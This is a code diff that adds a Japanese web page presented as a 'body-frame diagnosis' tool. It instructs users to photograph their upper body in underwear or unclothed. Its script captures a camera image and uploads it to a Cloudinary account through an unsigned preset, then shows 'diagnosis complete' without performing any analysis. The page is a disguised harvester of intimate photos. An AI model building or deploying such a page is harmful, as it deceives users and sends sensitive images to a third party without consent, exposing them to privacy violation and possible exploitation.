@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>骨格診断</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: #f6f7f9;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: #333;
+    }
+    header {
+      padding: 24px 16px 12px;
+      font-size: 28px;
+      font-weight: 700;
+    }
+    #camera {
+      margin: 16px auto;
+      width: 90%;
+      max-width: 360px;
+      border-radius: 16px;
+      overflow: hidden;
+      background: #000;
+    }
+    video, canvas {
+      width: 100%;
+      height: auto;
+    }
+    button {
+      margin: 20px auto;
+      padding: 14px 28px;
+      font-size: 16px;
+      border-radius: 999px;
+      border: none;
+      background: #111;
+      color: #fff;
+      cursor: pointer;
+    }
+    #loading {
+      display: none;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+    footer {
+      font-size: 12px;
+      color: #666;
+      padding: 20px;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+<header>骨格診断</header>
+
+<div id="camera">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
+<button id="shoot">撮影する</button>
+
+<div id="loading">診断中です…</div>
+
+<footer>
+  ※ 上半身の骨格が判断できる状態（肌着、または何も着用していない状態）で撮影してください。<br>
+  ※ 逆光にならないよう、明るい場所で撮影してください。
+</footer>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const shootBtn = document.getElementById("shoot");
+const loading = document.getElementById("loading");
+
+navigator.mediaDevices.getUserMedia({
+  video: { facingMode: "user" },
+  audio: false
+}).then(stream => {
+  video.srcObject = stream;
+});
+
+shootBtn.onclick = async () => {
+  loading.style.display = "block";
+  shootBtn.style.display = "none";
+
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg"));
+
+  const formData = new FormData();
+  formData.append("file", blob);
+  formData.append("upload_preset", "s1iuijuf");
+
+  await fetch("https://api.cloudinary.com/v1_1/auto/upload", {
+    method: "POST",
+    body: formData
+  });
+
+  setTimeout(() => {
+    loading.innerText = "診断が完了しました";
+  }, 2000);
+};
+</script>
+
+</body>
+</html>
